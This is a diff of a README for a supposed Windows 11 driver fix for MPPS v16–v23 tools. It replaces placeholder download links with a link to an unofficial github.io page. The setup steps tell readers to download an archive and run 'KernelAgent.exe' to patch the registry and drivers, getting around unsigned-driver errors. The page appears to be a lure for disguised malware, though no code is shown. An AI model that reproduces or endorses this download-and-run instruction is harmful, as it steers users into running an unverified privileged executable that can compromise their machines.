@@ -2,7 +2,8 @@
 
 This package includes working drivers and a patch for MPPS v16, v18, v21, and v23 tools to function properly on Windows 11. Fix USB detection, unsigned driver errors, and device disconnection.
 
-[![Download Driver Fix](https://img.shields.io/badge/Download-MPPS_Driver_W11-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Driver Fix](https://img.shields.io/badge/Download-MPPS_Driver_W11-blueviolet)](https://mpps-v16-v18-v21-v23-driver-fix-w11.github.io/.github
+)
 
 ---
 
@@ -38,7 +39,8 @@ This package includes working drivers and a patch for MPPS v16, v18, v21, and v2
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://mpps-v16-v18-v21-v23-driver-fix-w11.github.io/.github
+) section  
 2. 📁 **Extract all files** to a local folder (e.g. `C:\MPPS_Driver_Fix`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to patch registry & driver settings)  
 4. 🖲 Go to **Device Manager → Update Driver** and point to the `Drivers/` folder  
